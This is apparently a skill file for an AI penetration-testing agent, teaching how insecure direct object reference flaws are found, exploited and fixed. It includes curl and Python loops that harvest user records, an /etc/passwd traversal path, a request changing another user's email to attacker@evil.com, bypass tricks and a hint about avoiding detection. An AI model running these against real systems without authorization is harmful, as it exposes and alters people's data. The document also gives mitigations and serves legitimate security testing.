---
name: idor-testing
description: Professional skills and methodology for insecure direct object reference (IDOR) testing
version: 1.0.0
---

# Insecure Direct Object Reference (IDOR) Testing

## Overview

Insecure Direct Object Reference (IDOR) is an access control flaw that occurs when an application uses user-supplied input to access resources without verifying permission. This skill covers detection, exploitation, and prevention.

## How the Vulnerability Works

The application directly references resources using predictable identifiers (such as IDs or filenames) without verifying that the current user may access them.

**Unsafe code example:**
```php
// Directly use the user-supplied ID
$file = file_get_contents('/files/' . $_GET['id'] . '.pdf');
```

## Testing Methods

### 1. Identify Direct Object References

**Common resource types:**
- User IDs
- File IDs/filenames
- Order IDs
- Document IDs
- Account IDs
- Record IDs

**Common locations:**
- URL parameters
- POST data
- Cookie values
- HTTP headers
- File paths

### 2. Enumeration Testing

**Sequential ID testing:**
```
/user?id=1
/user?id=2
/user?id=3
```

**UUID testing:**
```
/user?id=550e8400-e29b-41d4-a716-446655440000
/user?id=550e8400-e29b-41d4-a716-446655440001
```

**Filename testing:**
```
/files/document1.pdf
/files/document2.pdf
/files/invoice_2024_001.pdf
```

### 3. Horizontal Access Control Testing

**Access another user's resources:**
```
Current user ID: 100
Test: /user?id=101
Test: /user?id=102
```

**Access another user's files:**
```
/files/user100_document.pdf
Test: /files/user101_document.pdf
```

### 4. Vertical Access Control Testing

**A regular user accesses administrator resources:**
```
/admin/users?id=1
/admin/settings
/admin/logs
```

## Exploitation Techniques

### User Information Disclosure

**Enumerate user profiles:**
```bash
# Sequential enumeration
for i in {1..1000}; do
  curl "https://target.com/user?id=$i"
done

# Observe response differences
```

### File Access

**Access another user's files:**
```
/files/invoice_12345.pdf
/files/report_67890.pdf
/files/contract_11111.pdf
```

**Combine with directory traversal:**
```
/files/../admin/config.php
/files/../../etc/passwd
```

### Data Modification

**Modify another user's data:**
```http
POST /api/user/update
Content-Type: application/json

{
  "id": 101,
  "email": "attacker@evil.com"
}
```

### Bulk Operations

**Retrieve data in bulk:**
```python
import requests

for user_id in range(1, 1000):
    response = requests.get(f'https://target.com/api/user/{user_id}')
    if response.status_code == 200:
        print(f"User {user_id}: {response.json()}")
```

## Bypass Techniques

### ID Obfuscation

**Base64 encoding:**
```
Original ID: 123
Encoded: MTIz
URL: /user?id=MTIz
```

**Hashes:**
```
Original ID: 123
Hash: 202cb962ac59075b964b07152d234b70
URL: /user?id=202cb962ac59075b964b07152d234b70
```

### Parameter Name Obfuscation

**Use different parameter names:**
```
/user?id=123
/user?uid=123
/user?user_id=123
/user?account=123
```

### HTTP Method Bypass

**Try different HTTP methods:**
```
GET /user/123
POST /user/123
PUT /user/123
PATCH /user/123
```

### Path Obfuscation

**Try different paths:**
```
/api/v1/user/123
/api/user/123
/user/123
/users/123
```

## Tools

### Burp Suite

**Use Intruder:**
1. Intercept a request
2. Send to Intruder
3. Mark the ID parameter
4. Use a number sequence or custom list
5. Observe response differences

**Use Repeater:**
1. Modify the ID manually
2. Test different values
3. Observe the response

### OWASP ZAP

```bash
# Scan for IDOR with ZAP
zap-cli active-scan --scanners all http://target.com
```

### Python Script

```python
import requests
import json

def test_idor(base_url, user_id_range):
    for user_id in user_id_range:
        url = f"{base_url}/user?id={user_id}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            print(f"User {user_id}: {data.get('email', 'N/A')}")

test_idor("https://target.com", range(1, 100))
```

## Verification and Reporting

### Verification Steps

1. Confirm that unauthorized resources can be accessed
2. Verify that another user's data can be read, modified, or deleted
3. Assess impact (data disclosure, privacy violations, etc.)
4. Record the complete proof of concept
5. Record confirmed findings with `report_finding`, the platform's only entry point for findings. Include location, type, severity, reproduction steps/PoC, and remediation guidance

### Report Essentials

- Vulnerability location and resource identifiers
- Unauthorized resources accessible
- Complete exploitation steps and PoC
- Remediation guidance (access control, resource mapping, etc.)

## Mitigations

### Recommended Approach

1. **Access control validation**
   ```python
   def get_user_data(user_id, current_user_id):
       # Validate permissions
       if user_id != current_user_id:
           raise PermissionDenied("Cannot access other user's data")
       
       # Return data
       return db.get_user(user_id)
   ```

2. **Indirect object references**
   ```python
   # Use a mapping table
   user_mapping = {
       'abc123': 100,
       'def456': 101,
       'ghi789': 102
   }
   
   def get_user(mapped_id):
       real_id = user_mapping.get(mapped_id)
       if not real_id:
           raise NotFound()
       return db.get_user(real_id)
   ```

3. **Role-based access control**
   ```python
   def check_permission(user, resource):
       if user.role == 'admin':
           return True
       if resource.owner_id == user.id:
           return True
       return False
   ```

4. **Resource ownership validation**
   ```python
   def update_user_data(user_id, data, current_user):
       user = db.get_user(user_id)
       
       # Verify ownership
       if user.id != current_user.id and current_user.role != 'admin':
           raise PermissionDenied()
       
       # Update data
       db.update_user(user_id, data)
   ```

5. **Use unpredictable identifiers**
   ```python
   import uuid
   
   # Use UUIDs instead of sequential IDs
   resource_id = str(uuid.uuid4())
   ```

6. **Principle of least privilege**
   - Return only data the user is authorized to access
   - Apply data filtering
   - Restrict the scope of accessible resources

## Considerations

- Test only in authorized environments
- Avoid accessing or modifying real user data
- Account for differences in resource access controls
- Watch request frequency to avoid triggering defenses